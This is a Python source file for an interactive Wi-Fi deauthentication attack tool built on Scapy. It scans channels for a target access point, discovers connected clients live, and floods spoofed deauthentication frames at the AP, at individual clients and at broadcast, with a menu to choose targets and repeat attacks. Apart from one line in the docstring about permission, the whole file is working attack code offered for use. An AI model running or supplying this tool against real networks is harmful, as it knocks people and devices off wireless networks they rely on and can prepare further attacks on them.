#!/usr/bin/env python3
"""
Deauthentication module — 802.11 deauth via Scapy.
Sends frames in both directions (AP→client and client→AP).
Discovers new clients live while attacking.
Use only on networks you own or have explicit permission to test.
"""

import subprocess
import signal
import time
import sys
import threading
import re
import os
from wifi_monitor import (find_wifi_interface, enable_monitor_mode,
                           disable_monitor_mode, get_monitor_interfaces,
                           _verify_monitor_mode)


def _check_scapy():
    try:
        from scapy.all import Dot11
        return True
    except ImportError:
        return False


def _set_channel(iface, channel):
    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                   capture_output=True, timeout=5)


def _get_supported_channels(iface):
    """Get list of supported 2.4GHz channels for interface."""
    try:
        r = subprocess.run(["iwlist", iface, "channel"],
                           capture_output=True, text=True, timeout=5)
        channels = re.findall(r"Channel (\d+)\s*:", r.stdout)
        # 2.4GHz only (1-14)
        return [int(c) for c in channels if 1 <= int(c) <= 14] or list(range(1, 14))
    except Exception:
        return list(range(1, 14))


def scan_for_ap(iface, target_ssid=None, target_bssid=None, timeout_per_ch=2):
    """
    Scan all channels for target AP.
    Returns dict with bssid, ssid, channel or None.
    """
    try:
        from scapy.all import sniff, Dot11Beacon, Dot11ProbeResp, Dot11Elt
    except ImportError:
        print("[!] Scapy not found. Install: sudo pip3 install scapy")
        return None

    channels = _get_supported_channels(iface)
    found = {}

    def pkt_handler(pkt):
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = pkt[0].addr2
            if not bssid:
                return
            ssid = ""
            if pkt.haslayer(Dot11Elt):
                try:
                    ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
                except Exception:
                    pass
            ch = 0
            elt = pkt[Dot11Elt]
            while elt:
                if elt.ID == 3:
                    try:
                        ch = ord(elt.info)
                    except Exception:
                        pass
                    break
                elt = elt.payload if hasattr(elt, "payload") else None
            found[bssid] = {"bssid": bssid, "ssid": ssid, "channel": ch}

    print(f"[*] Scanning channels for target...")
    for ch in channels:
        _set_channel(iface, ch)
        sniff(iface=iface, prn=pkt_handler, timeout=timeout_per_ch,
              store=False, monitor=True)

        # check if we found the target
        for bssid, info in found.items():
            if target_bssid and bssid.lower() == target_bssid.lower():
                print(f"[+] Found {info['ssid']} on ch{info['channel']}")
                return info
            if target_ssid and info["ssid"] == target_ssid:
                print(f"[+] Found {info['ssid']} ({bssid}) on ch{info['channel']}")
                return info

    return None


def flood_deauth(iface, bssid, channel, ssid=""):
    """
    Flood deauth using Scapy:
    - Sends AP→client AND client→AP frames for each known client
    - Broadcasts to ff:ff:ff:ff:ff:ff every round
    - Discovers new clients live via sniffer thread
    - Press Ctrl+C to stop
    """
    try:
        from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp,
                                sniff, Dot11AssoResp, Dot11ReassoResp, Dot11QoS)
    except ImportError:
        print("[!] Scapy not found. Install: sudo pip3 install scapy")
        return

    _set_channel(iface, channel)
    print(f"[*] Channel {channel}")

    clients = set()
    clients_lock = threading.Lock()
    stop_event = threading.Event()
    frames_sent = 0

    def make_deauth(src, dst, bssid_addr):
        return (RadioTap() /
                Dot11(addr1=dst, addr2=src, addr3=bssid_addr) /
                Dot11Deauth(reason=7))

    def send_to_client(client_mac):
        nonlocal frames_sent
        # AP → client
        sendp(make_deauth(bssid, client_mac, bssid),
              iface=iface, verbose=False)
        # client → AP
        sendp(make_deauth(client_mac, bssid, bssid),
              iface=iface, verbose=False)
        frames_sent += 2

    def send_broadcast():
        nonlocal frames_sent
        sendp(make_deauth(bssid, "ff:ff:ff:ff:ff:ff", bssid),
              iface=iface, verbose=False)
        frames_sent += 1

    def client_sniffer():
        """Passively discover associated clients."""
        def handler(pkt):
            if stop_event.is_set():
                return
            mac = None
            if pkt.haslayer(Dot11AssoResp):
                if pkt[Dot11AssoResp].status == 0:
                    mac = pkt[0].addr1
            elif pkt.haslayer(Dot11ReassoResp):
                if pkt[Dot11ReassoResp].status == 0:
                    mac = pkt[0].addr1
            elif pkt.haslayer(Dot11QoS):
                # data frame: check it's going to/from our AP
                if pkt[0].addr3 and pkt[0].addr3.lower() == bssid.lower():
                    candidate = pkt[0].addr1
                    if (candidate and
                            candidate.lower() != "ff:ff:ff:ff:ff:ff" and
                            candidate.lower() != bssid.lower()):
                        mac = candidate

            if mac and mac.lower() != "ff:ff:ff:ff:ff:ff":
                with clients_lock:
                    if mac not in clients:
                        clients.add(mac)
                        print(f"\n[+] New client: {mac}")

        sniff(iface=iface, prn=handler, store=False,
              stop_filter=lambda p: stop_event.is_set(), monitor=True)

    # start client sniffer in background
    sniffer_thread = threading.Thread(target=client_sniffer, daemon=True)
    sniffer_thread.start()

    label = ssid if ssid else bssid
    print(f"[*] Flooding deauth → {label}  [Ctrl+C to stop]")
    print(f"[*] Clients discovered live, broadcast every round")

    try:
        while True:
            # broadcast
            send_broadcast()

            # per-client (both directions)
            with clients_lock:
                current_clients = set(clients)
            for mac in current_clients:
                send_to_client(mac)

            elapsed = getattr(flood_deauth, "_start", time.time())
            print(f"\r[*] Frames: {frames_sent}  Clients known: {len(current_clients)}",
                  end="", flush=True)
            time.sleep(0.1)

    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[+] Stopped. Sent {frames_sent} deauth frames, "
              f"{len(clients)} clients targeted")


def deauth_menu(aps, clients, mon_iface):
    """Interactive deauth: pick network, flood starts immediately."""
    if not aps:
        print("[!] No networks found.")
        return

    print(f"\n{'='*70}")
    print(f" Select target network")
    print(f"{'='*70}")
    print(f" {'#':<4}{'ESSID':<28}{'BSSID':<20}{'Ch':<5}{'Enc':<12}{'Signal'}")
    print(f" {'-'*2:<4}{'-'*26:<28}{'-'*17:<20}{'-'*3:<5}{'-'*10:<12}{'-'*8}")
    for i, ap in enumerate(aps, 1):
        essid = ap["essid"][:26] if ap["essid"] else "<hidden>"
        ap_client_count = len([c for c in clients if c["bssid"] == ap["bssid"]])
        clients_str = f"  [{ap_client_count} clients]" if ap_client_count else ""
        print(f" {i:<4}{essid:<28}{ap['bssid']:<20}{ap['channel']:<5}"
              f"{ap['encryption']:<12}{ap['power']} dBm{clients_str}")
    print(f" {'='*70}")
    print(" Number to flood all, 'Nc1' for specific client, q to cancel:")

    choice = input("    > ").strip()
    if choice.lower() == "q":
        return

    client_mac = None
    m = re.match(r"(\d+)c(\d+)", choice)
    if m:
        net_num, cli_num = int(m.group(1)), int(m.group(2))
        try:
            ap = aps[net_num - 1]
        except IndexError:
            print("[!] Invalid network number")
            return
        ap_clients = [c for c in clients if c["bssid"] == ap["bssid"]]
        try:
            client_mac = ap_clients[cli_num - 1]["mac"]
        except IndexError:
            print("[!] Invalid client number")
            return
    else:
        try:
            ap = aps[int(choice) - 1]
        except (ValueError, IndexError):
            print("[!] Invalid selection")
            return

    bssid = ap["bssid"]
    essid = ap["essid"] or "<hidden>"
    channel = ap.get("channel", 6)

    if client_mac:
        # single client — use simple send_deauth loop
        print(f"\n[!] Deauth {essid} → {client_mac}  [Ctrl+C to stop]")
        _single_client_flood(mon_iface, bssid, client_mac, channel)
    else:
        print(f"\n[!] Flood deauth: {essid} ({bssid})")
        flood_deauth(mon_iface, bssid, channel, essid)


def _single_client_flood(iface, bssid, client_mac, channel):
    """Targeted flood at a single client (both directions)."""
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        print("[!] Scapy not found. Install: sudo pip3 install scapy")
        return

    _set_channel(iface, channel)

    def make_deauth(src, dst):
        return (RadioTap() /
                Dot11(addr1=dst, addr2=src, addr3=bssid) /
                Dot11Deauth(reason=7))

    frames = 0
    print(f"[*] Targeting {client_mac}  [Ctrl+C to stop]")
    try:
        while True:
            sendp(make_deauth(bssid, client_mac), iface=iface, verbose=False)
            sendp(make_deauth(client_mac, bssid), iface=iface, verbose=False)
            frames += 2
            print(f"\r[*] Frames: {frames}", end="", flush=True)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n[+] Stopped. Sent {frames} frames")


def interactive_deauth():
    """Full interactive deauth flow."""
    if not _check_scapy():
        print("[!] Scapy not found. Install: sudo pip3 install scapy")
        return

    # get monitor interface
    mon_interfaces = get_monitor_interfaces()
    mon_iface = None
    need_disable = False

    if mon_interfaces:
        mon_iface = mon_interfaces[0]
        print(f"[*] Using existing monitor interface: {mon_iface}")
    else:
        iface = find_wifi_interface()
        if not iface:
            print("[!] No Wi-Fi adapter found")
            return
        mon_iface = enable_monitor_mode(iface)
        need_disable = True

    if not _verify_monitor_mode(mon_iface):
        print(f"[!] {mon_iface} is not in monitor mode")
        return

    # scan
    print(f"\n[*] Scanning for 15s to find targets...")
    from wifi_monitor import run_airodump, parse_airodump_csv, print_wifi_results
    csv_path = run_airodump(mon_iface, 15)
    aps, clients = parse_airodump_csv(csv_path)

    if not aps:
        print("[!] No networks found")
        if need_disable:
            disable_monitor_mode(mon_iface)
        return

    print_wifi_results(aps, clients)

    while True:
        deauth_menu(aps, clients, mon_iface)
        print("\n[?] Attack another? (y/n)")
        if input("    > ").strip().lower() != "y":
            break

    if need_disable:
        disable_monitor_mode(mon_iface)
